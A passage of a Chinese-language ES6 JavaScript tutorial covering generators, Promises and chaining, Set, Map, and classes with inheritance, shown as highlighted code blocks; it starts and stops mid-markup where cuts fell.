<li><p>聲明生成器函數</p>
<ul>
<li>使用<code>function *</code>方式聲明生成器函數</li>
<li>使用<code>yield</code>語句作為分割符</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> * <span class="title function_">gen</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// Area 1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">111</span></span><br><span class="line">    <span class="comment">// Area 2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">222</span></span><br><span class="line">    <span class="comment">// Area 3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>調用函數</p>
<ul>
<li>與普通函數不同，必須使用<code>next</code>方法調用</li>
<li>每次調用<code>next()</code>方法，就會執行分割符<code>yield</code>及以上的代碼</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">gen</span>()</span><br><span class="line">iterator.<span class="title function_">next</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>參數傳遞</p>
<ul>
<li><code>next</code>方法是可以傳入實參，而實參就是<code>yield</code>語句的返回結果</li>
<li>而<font color="#f54747">第二次</font>調用<code>next</code>方法傳入的參數，將作為<font color="#f54747">第一個</font><code>yield</code>語句的返回結果，以此類推</li>
<li>如果要在第一個<code>yield</code>語句之前傳遞參數，則可以通過調用生成器<code>gen()</code>的時候傳入參數</li>
<li>具體代碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> * <span class="title function_">gen</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arg)    <span class="comment">// AAA</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> one = <span class="keyword">yield</span> <span class="number">111</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(one)    <span class="comment">// BBB</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> two = <span class="keyword">yield</span> <span class="number">222</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(two)    <span class="comment">// CCC</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">gen</span>(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">iterator.<span class="title function_">next</span>()     <span class="comment">// 第一次無法接收參數</span></span><br><span class="line">iterator.<span class="title function_">next</span>(<span class="string">&#x27;BBB&#x27;</span>)   <span class="comment">// 第一個 yield 語句的返回結果</span></span><br><span class="line">iterator.<span class="title function_">next</span>(<span class="string">&#x27;CCC&#x27;</span>)   <span class="comment">// 第二個 yield 語句的返回結果</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>實際應用：</p>
<ol>
<li>案例：一秒後輸出<code>111</code>，然後兩秒後輸出<code>222</code><ol>
<li><p>錯誤方式：平行處理異步任務</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">firstTask</span>()</span><br><span class="line"><span class="title function_">secondTask</span>()</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    因為異步任務之間有關聯度：先得到用戶數據，才可以獲取訂單數據</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>傳統方式：函數中嵌套後續函數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">firstTask</span>()</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">secondTask</span>()</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    陷入回調地獄，不方便插入新的異步任務，也不方便維護</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>生成器方式（<font color="#f54747">避免回調地獄</font>）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一個異步任務</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">firstTask</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>)</span><br><span class="line">        iterator.<span class="title function_">next</span>()     <span class="comment">// 第一個異步任務處理完調用 next 函數轉跳至下一個異步任務</span></span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二個異步任務</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">secondTask</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>)</span><br><span class="line">        iterator.<span class="title function_">next</span>()     <span class="comment">// 直到所有異步任務處理完畢</span></span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> * <span class="title function_">gen</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 使用 yield 語句分割異步任務</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="title function_">firstTask</span>()</span><br><span class="line">    <span class="keyword">yield</span> <span class="title function_">secondTask</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">gen</span>()</span><br><span class="line">iterator.<span class="title function_">next</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><ol>
<li>簡介：<ul>
<li><code>Promise</code>是 ES6 引入新的異步編程解決方案（主要解決回調地獄的問題）</li>
<li>語法上<code>Promise</code>是一個構造函數，用來封裝異步操作並可以獲取其成功或失敗的結果</li>
</ul>
</li>
</ol>
<h3 id="Promise基本使用"><a href="#Promise基本使用" class="headerlink" title="Promise基本使用"></a>Promise基本使用</h3><ol>
<li><p>實例化對象：</p>
<ul>
<li><code>Promise</code>是一個構造函數，因此可以實例化對象</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;</span><br><span class="line">    <span class="comment">// 異步操作 - 成功</span></span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;Data&#x27;</span></span><br><span class="line">    <span class="title function_">resolve</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 異步操作 - 錯誤</span></span><br><span class="line">    <span class="keyword">let</span> err = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="title function_">reject</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>then</code>方法</p>
<ul>
<li>可以對異步操作成功與失敗進行後續操作</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">p.<span class="title function_">then</span>(</span><br><span class="line">    <span class="comment">// 異步操作成功執行</span></span><br><span class="line">    <span class="function">(<span class="params">value</span>) =&gt;</span> &#123;    <span class="comment">// value 就是 resolve 傳入的參數</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(value)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 異步操作錯誤執行</span></span><br><span class="line">    <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;   <span class="comment">// reason 就是 reject 傳入的參數</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(reason)</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<ul>
<li>成功與失敗的回調可以編寫在異步操作的外面，避免回調地獄</li>
</ul>
</li>
</ul>
</li>
<li><p><code>catch</code>方法</p>
<ul>
<li>一個異步操作錯誤執行函數的「語法糖」</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 異步操作錯誤執行</span></span><br><span class="line">p.<span class="title function_">catch</span>(<span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(reason)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="Promise異步操作"><a href="#Promise異步操作" class="headerlink" title="Promise異步操作"></a>Promise異步操作</h3><ol>
<li><p><code>Promise</code>原型</p>
<ul>
<li><code>Promise</code>實例對象<code>then</code>方法的返回結果實際上也是一個<code>Promise</code>對象  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> result = p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 異步操作執行成功</span></span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 異步操作執行失敗</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)     </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    Promise&#123;</span></span><br><span class="line"><span class="comment">        [[Prototype]]: Promise</span></span><br><span class="line"><span class="comment">        [[PromiseState]]: &quot;fulfilled&quot;</span></span><br><span class="line"><span class="comment">        [[PromiseResult]]: undefined </span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure></li>
<li>注：<font color="#f54747"><code>PromiseState</code>的狀態是取決於回調函數的執行結果，並不是異步的操作結果</font></li>
</ul>
</li>
<li><p>四種回調函數的執行結果：</p>
<ol>
<li><p>第一種：沒有指定返回值</p>
<ul>
<li><code>PromiseState</code>為<code>fulfilled</code></li>
<li><code>PromiseResult</code>為<code>undefined</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>&#123;</span><br><span class="line">    [[<span class="title class_">Prototype</span>]]: <span class="title class_">Promise</span></span><br><span class="line">    [[<span class="title class_">PromiseState</span>]]: <span class="string">&quot;fulfilled&quot;</span></span><br><span class="line">    [[<span class="title class_">PromiseResult</span>]]: <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>第二種：返回非<code>Promise</code>對象的屬性</p>
<ul>
<li><code>PromiseState</code>為<code>fulfilled</code></li>
<li><code>PromiseResult</code>為返回值  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 非 Promise 對象的屬性</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>&#123;</span><br><span class="line">    [[<span class="title class_">Prototype</span>]]: <span class="title class_">Promise</span></span><br><span class="line">    [[<span class="title class_">PromiseState</span>]]: <span class="string">&quot;fulfilled&quot;</span></span><br><span class="line">    [[<span class="title class_">PromiseResult</span>]]: <span class="number">123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>第三種：返回<code>Promise</code>對象</p>
<ul>
<li><code>PromiseState</code>為返回<code>Promise</code>對象的狀態</li>
<li><code>PromiseResult</code>為返回<code>Promise</code>對象的結果  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 是 Promise 對象的屬性</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;ok&#x27;</span>)   <span class="comment">// [[PromiseState]]: &quot;fulfilled&quot;</span></span><br><span class="line">                    <span class="comment">// [[PromiseResult]]: &quot;ok&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>) <span class="comment">// [[PromiseState]]: &quot;rejected&quot;</span></span><br><span class="line">                    <span class="comment">// [[PromiseResult]]: &quot;error&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>第四種：拋出錯誤</p>
<ul>
<li><code>PromiseState</code>為<code>rejected</code></li>
<li><code>PromiseResult</code>為拋出的錯誤結果  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 拋出錯誤</span></span><br><span class="line"><span class="keyword">throw</span> <span class="string">&#x27;ERROR!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>&#123;</span><br><span class="line">    [[<span class="title class_">Prototype</span>]]: <span class="title class_">Promise</span></span><br><span class="line">    [[<span class="title class_">PromiseState</span>]]: <span class="string">&quot;rejected&quot;</span></span><br><span class="line">    [[<span class="title class_">PromiseResult</span>]]: <span class="string">&quot;ERROR!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>鏈式調用：</p>
<ul>
<li>由於<code>then</code>是可以返回<code>Promise</code>對象，所以<code>then</code>方法是可以鏈式調用</li>
<li>可以解決回調地獄問題</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">p</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 第二個異步操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>()</span><br><span class="line">    &#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;&#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 第三個異步操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>()</span><br><span class="line">    &#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;&#125;)</span><br><span class="line">    .<span class="title function_">then</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>實際案例：讀取多個文件</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 第一個異步任務</span></span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./test.md&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(data)   <span class="comment">// 傳入數據</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 返回新的 Promise 實例對象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 第二個異步任務</span></span><br><span class="line">        fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./test1.md&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>([value, data])  <span class="comment">// 將兩個異步任務數據寫入成一個數組並傳入</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 返回新的 Promise 實例對象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 第三個異步任務</span></span><br><span class="line">        fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./test2.md&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            value.<span class="title function_">push</span>(data)    <span class="comment">// 將新數據壓入傳入的數組中</span></span><br><span class="line">            <span class="title function_">resolve</span>(value)      <span class="comment">// 將三個異步任務數據的數組傳入</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 完成所有異步操作之後的執行代碼</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value.<span class="title function_">join</span>(<span class="string">&#x27;\r\n&#x27;</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 提供的新數據結構，類似於數組，但成員的值都是<font color="#f54747">唯一</font>的</li>
<li><code>Set</code>實現了迭代器 (<code>Iterator</code>) 接口，所以可以使用「擴展運算符」(<code>for...of</code>)進行遍歷</li>
</ul>
</li>
<li><p>基本使用：</p>
<ol>
<li><p>聲明<code>Set</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;May&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>, <span class="string">&#x27;Donald&#x27;</span>])  <span class="comment">// 自動去除重複的元素</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍歷<code>Set</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> s)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(v)  <span class="comment">// Set 裡面的元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>屬性和方法：</p>
<ol>
<li><p><code>size</code>屬性 - 返回集合的元素個數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.<span class="property">size</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>add</code>方法 - 添加一個新元素，返回當前集合</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.<span class="title function_">add</span>(<span class="string">&#x27;Tom&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>delete</code>方法 - 刪除元素，返回<code>boolean</code>值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.<span class="title function_">delete</span>(<span class="string">&#x27;John&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>has</code>方法 - 檢測集合中是否包含某個元素，返回<code>boolean</code>值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.<span class="title function_">has</span>(<span class="string">&#x27;May&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>clear</code>方法 - 清空集合，返回<code>undefined</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.<span class="title function_">clear</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>數學應用：</p>
<ol>
<li><p>去重</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[...<span class="keyword">new</span> <span class="title class_">Set</span>(arr)]   <span class="comment">// 將數組轉為集合，自動去重後再使用擴展運算符展開</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>交集</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[...<span class="keyword">new</span> <span class="title class_">Set</span>(arr)].<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> <span class="keyword">new</span> <span class="title class_">Set</span>(arr2).<span class="title function_">has</span>(item))</span><br><span class="line"><span class="comment">// 將一個數組去重後，使用 filter 過濾另一個數組，過濾出相同的元素</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>並集</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[...<span class="keyword">new</span> <span class="title class_">Set</span>([...arr, ...arr2])]     <span class="comment">// 將兩個數組合併再去重</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>差集</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[...<span class="keyword">new</span> <span class="title class_">Set</span>(arr)].<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !(<span class="keyword">new</span> <span class="title class_">Set</span>(arr2).<span class="title function_">has</span>(item)))    <span class="comment">// 交集的相反</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 提供的新數據類型，類似於對象，也是鍵值<code>key value</code>對的集合，但鍵<code>key</code>的返回不限於字符串，各種類型的值（包括對象）都可以當作鍵<code>key</code></li>
<li><code>Map</code>也實現了迭代器 (<code>Iterator</code>) 接口，所以可以使用「擴展運算符」(<code>for...of</code>)進行遍歷</li>
</ul>
</li>
<li><p>基本使用：</p>
<ol>
<li><p>聲明<code>Map</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>遍歷<code>Map</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> m)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(v)  <span class="comment">// v 是一個數組包含兩個元素：第一個是 key，第二個是 value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>屬性和方法：</p>
<ol>
<li><p><code>size</code>屬性 - 返回<code>Map</code>的元素個數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">m.<span class="property">size</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>set</code>方法 - 添加一個新的元素，返回當前<code>Map</code></p>
<ul>
<li><code>key</code>可以是各種類型 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// key - 字符串  value - 字符串</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Donald&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// key - 字符串  value - function</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;say&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// key - 對象  value - 數組</span></span><br><span class="line"><span class="keyword">let</span> key = &#123;</span><br><span class="line">    <span class="attr">school</span>: <span class="string">&#x27;CUHK&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">m.<span class="title function_">set</span>(key, [<span class="string">&#x27;CSCI&#x27;</span>, <span class="string">&#x27;CENG&#x27;</span>, <span class="string">&#x27;AIST&#x27;</span>])</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>get</code>方法 - 返回鍵名<code>key</code>對象的鍵值<code>key value</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">m.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>has</code>方法 - 檢測<code>Map</code>中是否包含某個元素，返回<code>boolean</code>值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">m.<span class="title function_">get</span>(key)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>delete</code>方法 - 刪除一個元素，返回<code>boolean</code>值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">m.<span class="title function_">delete</span>(<span class="string">&#x27;name&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>clear</code>方法 - 清空集合，返回<code>undefined</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">m.<span class="title function_">clear</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><ol>
<li>簡介：<ul>
<li>ES6 提供了更接近傳統語言的寫法，引入了<code>Class</code>的概念，作為對象的模板</li>
<li>通過<code>class</code>關鍵字定義類</li>
<li>基本上，ES6 的<code>class</code>可以看作是一個語法糖，絕大部分功能，ES5 的構造函數也可以做到，新的<code>class</code>寫法只是讓對象原型的寫法變得更加清晰、更像面向對象編程語法</li>
</ul>
</li>
</ol>
<h3 id="Class基本使用"><a href="#Class基本使用" class="headerlink" title="Class基本使用"></a>Class基本使用</h3><ol>
<li><p>基本使用：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 創建類</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="comment">// 構造器</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 方法 - 必須使用該語法，不能使用 ES5 的對象完整式</span></span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am eating&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>靜態屬性與方法：</p>
<ul>
<li>ES5 中，實例對象和函數對象之間的屬性與方法不相通，實例對象只與函數的原型對象上的屬性和方法相通</li>
<li>而 ES6 的<code>class</code>裡所定義的屬性與方法和實例對象是相通</li>
<li>如果要兩者不相通，則需要加上<code>static</code>關鍵字，讓屬性與方法變成靜態</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am eating&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>getter</code>與<code>setter</code></p>
<ul>
<li>用於獲取與修改屬性時執行</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">name</span>()&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Get name&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// setter必須接收參數</span></span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">name</span>(<span class="params">params</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Name has been changed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="繼承"><a href="#繼承" class="headerlink" title="繼承"></a>繼承</h3><ol>
<li><p>構造函數實現：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父構造函數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Phone</span>(<span class="params">brand, price</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">brand</span> = brand</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">price</span> = price</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 聲明父構造函數的方法</span></span><br><span class="line"><span class="title class_">Phone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am calling&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子構造函數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SmartPhone</span>(<span class="params">brand, price, color, size</span>)&#123;</span><br><span class="line">    <span class="title class_">Phone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, brand, price)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">size</span> = size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設置子級別構造函數的原型</span></span><br><span class="line"><span class="title class_">SmartPhone</span>.<span 